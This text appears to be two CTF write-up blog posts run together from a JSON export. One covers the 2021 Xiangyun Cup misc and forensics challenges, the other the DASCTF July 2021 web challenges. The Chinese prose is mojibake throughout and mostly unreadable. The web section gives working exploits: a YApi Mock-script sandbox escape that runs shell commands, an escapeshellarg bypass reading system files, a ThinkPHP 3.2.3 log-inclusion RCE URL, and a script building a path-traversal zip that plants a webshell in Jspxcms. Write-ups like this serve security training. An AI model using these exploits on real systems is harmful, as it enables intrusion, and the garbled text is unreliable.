ç¬¬äºŒå±Šâ€ç¥¥äº‘æ¯â€ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ› æ¯”èµ›æ—¶é—´ï¼š2021-08-21 09:00 ~ 2021-08-22 09:00 æ¯”èµ›å®˜ç½‘ï¼šhttps://xiangyuncup.ichunqiu.com/ åˆæ˜¯ä¸€ä¸ªæ‰“ CTF çš„å‘¨æœ«ï¼Œè¿™å‘¨æ‰“äº†ä¸ªç¥¥äº‘æ¯ï¼Œæ‘¸é±¼æ‘¸é±¼ï¼Œç´¯ç´¯ï¼ˆ å–µå–µä¸»è¦åœ¨çœ‹ Misc é¢˜ç›®ï¼Œå…¶ä»–é¢˜ç›®çœ‹çš„ä¸å¤šï¼Œå’Œé˜Ÿå‹ä»¬ä¸€èµ·æ¥ç©çš„ã€‚ Miscé¸£é›æ‹ åœ¨å–œæ¬¢çš„äººé¢å‰,æˆ‘å¯ä¸èƒ½â€¦â€¦ä¸¢è„¸å•Šâ€¦â€¦å› ä¸ºæˆ‘,å–œæ¬¢é¸£äººå›â€¦â€¦â€¦â€¦ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ docx é‡Œé¢è—äº†ä¸œè¥¿ï¼Œç›´æ¥è§£å‹æå– key.txt é›¶å®½éšå†™ Because I like naruto best ä½œä¸ºå¯†ç ï¼Œè§£å‹å¾—åˆ°ä¸€å †çš„å›¾ç‰‡ å‘ç°åªæœ‰ä¸¤ç§å›¾ç‰‡ï¼Œæ¢æˆ 0/1 å¯¼å‡ºï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä¸Šé¢å°±æœ‰ flag import os files = os.listdir('out/') with open('out/0.png', 'rb') as f: f0 = f.read() with open('out/1.png', 'rb') as f: f1 = f.read() data = [] for i in range(129488): filename = 'out/' + str(i) + '.png' print(filename) with open(filename, 'rb') as f: content = f.read() if content == f0: data += [0] elif content == f1: data += [1] print(data) d = ''.join(map(str, data)) with open('data1.txt', 'w') as fout: fout.write(d) len(data) result = ''.join(list(map(str, data))) for i in range(0, len(result), 8): byte = result[i:i+8] print(chr(int(byte, 2)), end=\"\") flag{57dd74fb21bb1aee50f19421bf836f23} å±‚å±‚å–è¯ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰ ï¼ˆæœ¬é¢˜é™„ä»¶è¾ƒå¤§ï¼‰ ï¼ˆè¿™ä¸ªæ–‡ä»¶é•œåƒ 13GB ä¹Ÿå¤ªå¤§äº†å§â€¦â€¦ ä»–è¿™ä¸ªæ˜¯ç”¨ ftk æçš„é•œåƒ ä»å†…å­˜é•œåƒé‡Œå¯¼å‡º bitlocker å¯†é’¥ $ volatility --plugins=plugins/bitlocker -f memdump.mem --profile=Win7SP1x64 bitlocker Volatility Foundation Volatility Framework 2.6 Address : 0xfa800d12e7e0 Cipher : AES-128 FVEK : 0ff9192acdbf1df3c6dc36fb58cf76ce TWEAK : b423bd84872ff72b583bb9bdee1762ac å–è¯å¤§å¸ˆæŒ‚è½½ç£ç›˜ï¼Œè§£å¼€ bitlockerï¼Œxiaoming æ¡Œé¢ä¸Šæœ‰ä¸ª flag.txt ï¼Œå’Œå†…å­˜ notepad è¿›ç¨‹é‡Œçš„å†…å®¹ä¸€è‡´ hint: ä½ è¿ç”µè„‘éƒ½ä¸èƒ½ä»¿çœŸæ‰“å¼€ï¼Œè¿˜æƒ³è¦flag ? åŠ å¯†ç›˜é‡Œå‘ç°æœ‰ä¸ª 2.pcapng æµé‡åŒ… å¤§éƒ¨åˆ†æµé‡æ˜¯åœ¨æœ CTFã€flagã€é»‘å®¢ å•¥çš„ï¼Œä¸è¿‡ strings å‘ç°æœ‰ä¸ª flag.docxï¼Œåœ¨ä¸€å † udp æµé‡é‡Œå‘ç°äº†è¿™ä¸ª rar ä»å†…å­˜é•œåƒ hashdump è§£ hash å¾—åˆ°å¼€æœºå¯†ç ä¸º xiaoming_handsomeï¼Œä½†æ˜¯è§£å‹å¾—åˆ°çš„ docx è¿˜æœ‰ä¸ªæ‰“å¼€å¯†ç ã€‚ ä»¿çœŸå‘ç°ä¾¿ç­¾ä¸‹é¢è¿˜è—äº†ä¸ªä¾¿ç­¾â€¦â€¦ æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶ StickyNotes.snt ç”¨ xiaoming1314 æ‰“å¼€ wordï¼Œæ‹¿åˆ° flag flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2} è€ƒå¤ å°æ˜åœ¨å®¶é‡Œç¿»åˆ°ä¸€å°å¾ˆå¤è€çš„xpç¬”è®°æœ¬ï¼Œæ¢ç”µæ± ä¹‹åå‘ç°å¯ä»¥æ­£å¸¸å¼€æœºï¼Œä½†æ˜¯å‘ç°ç¡¬ç›˜ç©ºé—´ä¸è¶³ã€‚æ¸…ç†è¿‡ç¨‹ä¸­å´å‘ç”Ÿäº†ä¸€äº›ä¸æ„‰å¿«çš„äº‹æƒ…â€¦ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å’‹åˆæ˜¯å–è¯å•Šï¼ˆï¼ˆ $ volatility -f memory --profile=WinXPSP2x86 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: csrss.exe Pid: 620 CommandHistory: 0x3833938 Application: cmd.exe Flags: Allocated, Reset CommandCount: 16 LastAdded: 15 LastDisplayed: 15 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x404 Cmd #0 @ 0x3832110: It's useless to find so many things Cmd #1 @ 0x3832ed0: ........................ Cmd #2 @ 0x52c778: what can i do about it Cmd #3 @ 0x3833360: Heard that there is a one-click cleaning that is very useful Cmd #4 @ 0x52b3c8: try it Cmd #5 @ 0x52b7e8: \"C:\\Documents and Settings\\Administrator\\??\\Oneclickcleanup.exe\" Cmd #6 @ 0x5224a0: what??? Cmd #7 @ 0x52d5c0: what happened?? Cmd #8 @ 0x52d410: who is 1cepeak? Cmd #9 @ 0x3832de0: what's the meaning of hack? Cmd #10 @ 0x3830e50: oh,no Cmd #11 @ 0x52af40: holy shit Cmd #12 @ 0x3830cf8: aaaaaa Cmd #13 @ 0x522d28: Nonononononononononononono!!!!!!!!!!!!!!!! Cmd #14 @ 0x522d88: \"C:\\Documents and Settings\\Administrator\\??\\Oneclickcleanup.exe\" Cmd #15 @ 0x5224b8: fuc ************************************************** è¿™ä¸ª Oneclickcleanup.exe å¾ˆå¯ç–‘ï¼Œäºæ˜¯ dump å‡ºæ¥çœ‹ä¸€ä¸‹é€†ä¸€ä¸‹ã€‚ å¯ä»¥çœ‹åˆ°å¾ªç¯å¼‚æˆ–è¿™ä¸ª keyï¼Œå³ this_a_keyï¼Œç„¶åæŠŠå†…å®¹å†™å…¥æ–‡ä»¶ã€‚ æŒ‰é€»è¾‘å†™ä¸ªè„šæœ¬å¯¼å‡º data = bytearray() with open('data.txt', 'r', encoding='utf-8') as f: while True: s = f.readline() if not s: break l = s.split(',') # print(l) for i in l: d = i.strip() data.append(int(d, 16)) print(data) key = b'this_a_key' data_decode = bytearray() for i in range(len(data)): data_decode.append(data[i] ^ key[i % len(key)]) print(data_decode) with open('1.doc', 'wb') as f: f.write(data_decode) èµ›åé—®äº†é—®é˜Ÿé‡Œ binary çˆ·çˆ·ï¼Œæ‰çŸ¥é“ IDA é‡Œç›´æ¥æŒ‰ Shift + E å°±èƒ½ç›´æ¥å¯¼å‡ºæ•°æ®ï¼Œè¿™æ ·å°±ä¸ç”¨å¤åˆ¶ç²˜è´´ç„¶åè‡ªå·±æ‰‹åŠ¨å¤„ç†è¿™ä¸ªåŸå§‹æ•°æ®äº†â€¦â€¦ åŒç†ï¼Œæ–‡ä»¶åï¼Œä¸è¿‡è²Œä¼¼æ²¡å•¥ç”¨ï¼ˆ # filename filename = bytearray() filename += b'7R570' with open('data2.txt', 'r', encoding='utf-8') as f: s = f.readline() while True: s = f.readline() if not s: break d = s.strip() filename.append(int(d, 16)) print(filename) filename_decode = bytearray() for i in range(len(filename)): filename_decode.append(filename[i] ^ key[i % len(key)]) print(filename_decode) # bytearray(b'C:\\\\Documents and Settings\\\\All Users\\\\Templates') å‘ç°æ–‡ä»¶æ˜¯ä¸ª docï¼Œé‡Œé¢å°±ä¸€å¥è¯ æŸ¥çœ‹æ–‡ä»¶ hexï¼Œå‘ç°è¿™å¥è¯åé¢è¿˜æœ‰ç‚¹ä¸œè¥¿ï¼Œå‚è€ƒå‰é¢çš„å¼‚æˆ–é€»è¾‘ï¼Œè¿™é‡Œçˆ†ç ´äº†ä¸€ä¸‹ keyï¼Œæœ€åå‘ç° key æ˜¯ -ã€‚ã€‚ import string with open('1.doc', 'rb') as f: raw = f.read() # l = string.ascii_letters l = [bytes([i]) for i in range(1, 256)] for i in l: x = bytearray() for data in raw: x.append(ord(i) ^ data) # print(x) if b'flag' in x: print('!!!!!!!!!!!!') print(i) print(x) print('=======================') print() é¡ºä¾¿å’ŒåŸå§‹æ–‡ä»¶å¯¹æ¯”ä¸€ä¸‹ã€‚ flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309} ChieftainsSecret Our agent risked his life to install a mysterious device in the immemorial telephone, can you find out the chieftainâ€™s telephone number? Flag format: flag{11 digits} é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ å›¾ç§ï¼Œåé¢æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°ç”µè·¯å›¾å’Œæ•°æ®ã€‚ TLE5501 è¿™ä¸ªèŠ¯ç‰‡æ˜¯ä¸ªè§’åº¦å’Œçº¿æ€§ä½ç½®ä¼ æ„Ÿå™¨ï¼Œé€šè¿‡é‡‡é›†ç£åœºçš„å˜åŒ–ï¼Œä»–èƒ½ååº”å‡ºè§’åº¦å˜åŒ–ï¼Œç„¶åè¾“å‡ºå·®åˆ†çš„æ­£ä½™å¼¦ä¿¡å·ã€‚ åº”è¯¥æ˜¯è€å¼æ‹¨å·é‚£ä¸ªç›˜ï¼Œä»–ç›¸å½“äºé‡‡é›†äº†é‚£ä¸ªçš„è§’åº¦æ•°æ® https://www.mouser.cn/new/infineon/infineon-tle5501-e0001-e0002-xensiv-sensors/https://www.mouser.sg/new/infineon/infineon-tle5501-evaluation-kit/https://www.infineon.com/cms/cn/product/sensor/magnetic-sensors/magnetic-position-sensors/angle-sensors/tle5501-e0001/(Datasheet è§£é¢˜ä¸Šç”¨å¤„ä¸å¤ªå¤§ ç»™äº†å•ç‰‡æœºé‡‡é›†åˆ°çš„ä¿¡å·ï¼Œè€ƒè™‘é€šè¿‡æ­£ä½™å¼¦å€¼æ±‚è§£è§’åº¦ï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯è½¬ç›˜çš„è§’åº¦ï¼Œåº”è¯¥å’Œæ‹¨ç›˜ä¸Šçš„æ•°å­—æˆæ­£æ¯” å…ˆæŠŠæ•°æ®ç”»ä¸ªå›¾ å¯ä»¥çœ‹å‡ºç¡®å®æ˜¯å·®åˆ†çš„æ­£ä½™å¼¦ä¿¡å·ï¼Œè€ƒè™‘æŠŠè¿™ä¸ªå››å…ƒç»„è½¬æ¢ä¸ºè§’åº¦ import math import matplotlib.pyplot as plt import numpy as np # plt.figure() data1 = [] data2 = [] data3 = [] data4 = [] with open('adc.csv', 'r') as f: f.readline() for i in range(2162): s = f.readline() # print(s) s = s.split(',') data1.append(int(s[0])) data2.append(int(s[1])) data3.append(int(s[2])) data4.append(int(s[3])) print(len(data1)) data_sin = np.array(data1)-np.array(data2) data_sin = data_sin/max(data_sin) data_cos = np.array(data3)-np.array(data4) data_cos = data_cos/max(data_cos) angle = np.arcsin(data_sin)/np.pi*180 plt.plot(angle) plt.grid(True) # plt.show() angle2 = np.arccos(data_cos)/np.pi*180 plt.plot(angle2) plt.grid(True) plt.show() ç”±äºè¶…è¿‡äº†180åº¦ä¸­é—´çš„è§’åº¦ä¼šåè€Œå‡å°ï¼Œè¦åŠ å›å»ã€‚ã€‚ æ•´æ¥æ•´å»è¿˜ä¸å¦‚ç›´æ¥è¯»åæ ‡ï¼Œå¾—åˆ°å¤§æ¦‚è§’åº¦åˆ†åˆ«ä¸º 212, 212, 282, 234, 164, 258, 193, 90, 140, 161, 212 æœ€åæ‰‹åŠ¨ç”¨é‡è§’å™¨å‡ºäº†â€¦â€¦éš¾å—æ­»äº†ï¼ˆ flag{77085962457} ï¼ˆå¯»æ€ç€å¤§æ¦‚æ¯ä¸ªæ•°å­—å·® 360/15=24 åº¦ï¼Œå¤šè¯•å‡ æ¬¡å…¶å®ä¹Ÿè¡Œ æ¯”èµ›åæƒ³åˆ°ï¼Œsin cos å€¼éƒ½ç»™äº†ï¼Œä¸ºå•¥ä¸ç›´æ¥æ±‚ tan ç„¶å arctan å‡ºè§’åº¦å•Šï¼Œä»¥åŠï¼Œç›´æ¥ excel é‡Œç®—æ›´æ–¹ä¾¿ã€‚ å–µå–µæ˜¯ fwâ€¦â€¦ å°ç»“å–è¯å¥½çƒ¦å•Šâ€¦â€¦ä¸€å †è„‘æ´ï¼Œè€Œä¸”å å–µå–µç¡¬ç›˜ä¸€å †ç©ºé—´ï¼Œç›˜éƒ½æ»¡äº†å•Šå•Šå•Šå•Šå•Šã€‚ å¾ˆéš¾å¾—åœ¨ CTF é‡Œè¿˜èƒ½ç¢°åˆ°ç¡¬ä»¶ç›¸å…³æˆ–è€…æ²¾è¾¹çš„é¢˜ç›®ï¼Œè€Œä¸”ä¸€æ¬¡è¿˜æ¥ä¿©ï¼Œè¿˜æœ‰ä¸ªé€†å‘é¢˜ç»™äº†ä¸ª ARM å•ç‰‡æœºè¿æ¥ W25Q16 å†…å­˜èŠ¯ç‰‡ï¼Œç»™äº†ä¸ª hexdump æ ·å¼çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªé€»è¾‘åˆ†æä»ªæŠ“åˆ°çš„ä¿¡å·ï¼Œå–µå–µä»¥ä¸ºè¿™ä¸ª hex æ˜¯å†…å­˜äº†ï¼Œæœ€åå‘ç°å…¶å®æ˜¯è¦é€†å‘è¿™ä¸ª hex æ–‡ä»¶â€¦â€¦ æƒ³ä¸åˆ°è¿˜èƒ½åœ¨ CTF é‡Œå¤ä¹ æ•°ç”µçŸ¥è¯† 233333. å¤ªå·å•¦å¤ªå·å•¦ï¼Œåˆæ˜¯æœ€åå‡ åˆ†é’Ÿç–¯ç‹‚æ‰æ’åã€‚ æœ€åæ’ 34 ä½†åªè¿›å‰ 30ï¼Œéš¾å—å—ï¼Œåˆä¸èƒ½å‡ºå»çº¿ä¸‹æ‘¸é±¼æ—…æ¸¸äº†ï¼Œå–µå‘œå‘œã€‚ pwn é¢˜ä¹Ÿå¤ªå¤šäº†å§â€¦â€¦ è¿™æ¬¡æ²¡å¾—ç©ºçœ‹ web é¢˜ï¼Œå–µå–µæ˜¯ fwï¼Œå–µå‘œå‘œã€‚ æ„Ÿè°¢é˜Ÿå‹ä»¬å¸¦å’±ä¸€èµ·ç© qwq~ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/08/24/CTF_2021XiangYun/"},{"title":"CTF | 2021 DASCTF July X CBCTF 4th éƒ¨åˆ†WriteUp","text":"æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼šhttps://www.anquanke.com/post/id/252295 å¼•è¨€ 2021DASCTF å®æˆ˜ç²¾è‹±å¤ä»¤è¥é¢„çƒ­èµ›æš¨ DASCTF July X CBCTF 4th æ¯”èµ›æ—¶é—´ï¼š2021å¹´7æœˆ31æ—¥ 10:00 - 8æœˆ1æ—¥ 18:00 https://buuoj.cn/match/matches/15/challenges åˆæ˜¯æ‘¸é±¼çš„ä¸€ä¸ªå‘¨æœ«ï¼Œä¸è¿‡è¿™ä¸ªæ¯”èµ›å’Œ å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› å†²çªäº†ï¼Œé‚£ä¸ªæ¯”èµ›å†™äº†ç‚¹ wp åœ¨ä¸‹é¢è¿™ç¯‡ã€‚ CTF | 2021 å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› WriteUp äºæ˜¯ç¬¬ä¸€å¤©éƒ½åœ¨æ‰“é‚£ä¸ªæ¯”èµ›ï¼Œè¿™è¾¹å°±ç¬¬äºŒå¤©ä¸‹åˆéšä¾¿çœ‹äº†çœ‹ã€‚ ä¸è¿‡çœ‹äº†å‡ é¢˜ web å‘ç°æœ‰ä¸å°‘æ˜¯å¤ç°æ¼æ´æˆ–è€…è‡ªå·±æŒ–æ´çš„é¢˜ï¼Œå¯»æ€ç€è¿˜æœ‰ç‚¹å‘³é“ï¼Œèµ›ååˆæ¥å¤ç°äº†ä¸€ä¸‹ã€‚ ä¸»è¦çœ‹çš„æ˜¯ Web å’Œ Misc é¢˜ç›®ï¼Œè¿™ç¯‡å¤§éƒ¨åˆ†æ˜¯è¾¹åšè¾¹å†™çš„ï¼Œå†™å¾—è¿˜æ˜¯æŒºè¯¦ç»†çš„å§ï¼Œå½“ç„¶ä¹Ÿå°‘ä¸äº†èµ°å¼¯è·¯çš„åœ°æ–¹ã€‚ å¤§å¸ˆå‚…ä»¬éšä¾¿çœ‹çœ‹å°±å¥½äº†ï¼ˆ Webezrce ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ å‚è€ƒ yapiè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆéƒ¨ç½²+å¤ç°ï¼‰ å…ˆæ³¨å†Œä¸ªè´¦å·ï¼Œç„¶åæ·»åŠ ä¸ª é«˜çº§ Mock è„šæœ¬å³å¯ã€‚ const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const test = FunctionConstructor('return process') const process = test() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami &amp;&amp; ps -ef &amp;&amp; ls -al /&amp;&amp; cat /ffffffflllllaggggg\").toString() å†ç‚¹å‡»è¿™ä¸ªé¢„è§ˆçš„åœ°å€å³å¯ã€‚ cat flag ç®€ç®€å•å•cat flag Hint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag &lt;?php if (isset($_GET['cmd'])) { $cmd = $_GET['cmd']; if (!preg_match('/flag/i',$cmd)) { $cmd = escapeshellarg($cmd); system('cat ' . $cmd); } } else { highlight_file(__FILE__); } ?&gt; escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·) å®šä¹‰ ï¼šstring escapeshellarg ( string $arg ) å€’æ˜¯è¿™ä¸ªå•ç‹¬ç”¨è²Œä¼¼ä¸å­˜åœ¨ç»•è¿‡å•¥çš„ï¼ˆbushi è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜ æµ…è°ˆescapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥ ä¸€æ–¹é¢æ˜¯ å…ˆ escapeshellarg å† escapeshellcmd å¤„ç†çš„è¯å­˜åœ¨å‚æ•°æ³¨å…¥ï¼Œå¦ä¸€æ–¹é¢ä¸»è¦æ˜¯é€šè¿‡è°ƒç”¨çš„å‘½ä»¤ï¼ˆå¦‚ tar find wget curl ä¹‹ç±»ï¼‰è‡ªå¸¦çš„å‚æ•°æ¥å®ç°ç»•è¿‡æˆ–è€…æ‰§è¡Œå…¶ä»–çš„å‘½ä»¤ã€‚ å…ˆè¯»å‡ ä¸ªæ–‡ä»¶çœ‹çœ‹ã€‚ /etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin ç³»ç»Ÿæ˜¯ Alpine Linux, ash NAME=\"Alpine Linux\" ID=alpine VERSION_ID=3.13.0 PRETTY_NAME=\"Alpine Linux v3.13\" HOME_URL=\"https://alpinelinux.org/\" BUG_REPORT_URL=\"https://bugs.alpinelinux.org/\" ç¯å¢ƒå˜é‡ http://xxxxxxxxxxx/?cmd=/proc/self/environ PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgiUSER=www-dataHOSTNAME=bd65ff0cb21ePHP_INI_DIR=/usr/local/etc/phpSHLVL=2HOME=/home/www-dataPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_VERSION=7.3.26GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5DPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-7.3.26.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-7.3.26.tar.xzPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2cPWD=/var/www/htmlPHP_SHA256=d93052f4cb2882090b6a37fd1e0c764be1605a2461152b7f6b8f04fa48875208FLAG=not_flag FLAG=not_flagï¼Œè‰ï¼ ï¼ˆåº”è¯¥æ˜¯å› ä¸ºåŠ¨æ€ flag æ˜¯é€šè¿‡ ENV æ¥é…ç½®çš„ï¼Œå†™å…¥æ–‡ä»¶ä¹‹åæŠŠ ENV ç»™æ›¿æ¢æ‰äº† æ ¹æ®æç¤ºï¼Œå¯»æ€ç€è¯» nginx log http://xxxxx/?cmd=/var/log/nginx/access.log 127.0.0.1 - - [11/Jul/2020:00:00:00 +0000] \"GET /this_is_final_flag_e2a457126032b42d.php HTTP/1.1\" 200 5 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\" 192.168.122.180 - - [31/Jul/2021:20:16:06 +0000] \"GET / HTTP/1.1\" 200 1855 \"-\" \"python-requests/2.25.1\" 192.168.122.180 - - [31/Jul/2021:20:16:09 +0000] \"GET / HTTP/1.1\" 200 1855 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\" 192.168.122.180 - - [31/Jul/2021:20:16:26 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1855 \"http://9f6ec27d-77be-4de4-9373-f93a8bd50480.node4.buuoj.cn/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\" ... æ‰€ä»¥æ–‡ä»¶æ˜¯ this_is_final_flag_e2a457126032b42d.phpï¼Œä¸è¿‡åŒ…å«äº† flagã€‚ å‚è€ƒ https://www.php.net/manual/zh/function.escapeshellarg.php å¯ä»¥åŠ ä¸ªé ASCII ç å­—ç¬¦ç»•è¿‡ escapeshellargï¼Œæµ‹è¯•å‘ç° %80 åŠä»¥ä¸Šéƒ½è¡Œã€‚ easythinkphpThinkPHP V3.2.3 ç›´æ¥ç°æˆå·¥å…·ä¸€æŠŠæ¢­ http://xxxxxxxxxx/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_08_01.log åŸç†å¯å‚è€ƒ ç‚’å†·é¥­ä¹‹ThinkPHP3.2.X RCEæ¼æ´åˆ†æ å¤§æ¦‚å°±æ˜¯å…ˆå†™ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„æŠ¥é”™è¯­å¥åˆ°æ—¥å¿—é‡Œï¼Œç„¶åæ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œå‘½ä»¤ã€‚ å¦å¤–è¿˜æœ‰å…¶ä»–å¸ˆå‚…è¯´å…¶å®å¯ä»¥ç›´æ¥æ–‡ä»¶åŒ…å«æ¥è¯» /flag. m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=/flag jspxcmsåå° http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/cmscp/index.do é»˜è®¤ç™»å½•ä¿¡æ¯ admin / ç©º Jspxcms v9.5.1 å‚è€ƒ å¤ç°jspxcmsè§£å‹getshellæ¼æ´ è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘ç°çš„â€œä¸å®‰å…¨è§£å‹getshellâ€ unzip æ–¹æ³•æœªå¯¹ ZIP å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶åè¿›è¡Œå‚æ•°æ ¡éªŒï¼Œå°±è¿›è¡Œæ–‡ä»¶çš„å†™å…¥ï¼Œæ„é€ å¸¦æœ‰ ../ çš„æ–‡ä»¶åå°±èƒ½æ„æˆç›®å½•ç©¿è¶Šæ¼æ´ã€‚ é¦–å…ˆåŸºäºå†°èé©¬ç”Ÿæˆ war åŒ…ã€‚ jar cvf shell.war shell.jsp ç„¶åç”¨è„šæœ¬æŠŠ war åŒ…å‹ç¼©ä¸€ä¸‹ã€‚ import zipfile z = zipfile.ZipFile('miao.zip', 'w', zipfile.ZIP_DEFLATED) with open('shell.war','rb') as f: temp=f.read() z.writestr('../../../shell.war',temp) #shell.warä¸ºä¸Šä¸€æ­¥ç”Ÿäº§çš„åé—¨waråŒ… z.close() é€šè¿‡ ä¸Šä¼ æ–‡ä»¶ ä¸Šä¼ å‹ç¼©åŒ…ï¼Œç„¶å zipè§£å‹ éƒ¨ç½²ä¸Šå»ã€‚ http://xxxxxxxxxxxx/shell/shell.jsp å†°èæˆåŠŸè¿ä¸Š å¯ä»¥çœ‹åˆ°æœ¬æ¥ä¸Šä¼ çš„ç›®å½•æ˜¯ uploads/1/ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šè§£å‹åˆ°äº†ä¸Šçº§çš„ tomcat/webapps ç›®å½•ä¸‹äº†ã€‚ å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥å‚è€ƒ é›ªå§å§çš„åŠæ³•ï¼Œç›´æ¥æ–°å»ºä¸ªé¡µé¢ï¼Œé€šè¿‡ JavaScript å†™å…¥ä¸ªç®€å•çš„è°ƒè¯•é¡µé¢ï¼Œç›´æ¥åœ¨æµè§ˆå™¨é‡Œæ‰§è¡Œå‘½ä»¤ã€ä¸Šä¼ æ–‡ä»¶ã€‚ æ–°å»ºä¸ªä¹¦ç­¾ï¼Œç„¶åç›´æ¥åœ¨ shell çš„é¡µé¢åŠ è½½ä¹¦ç­¾ã€‚ 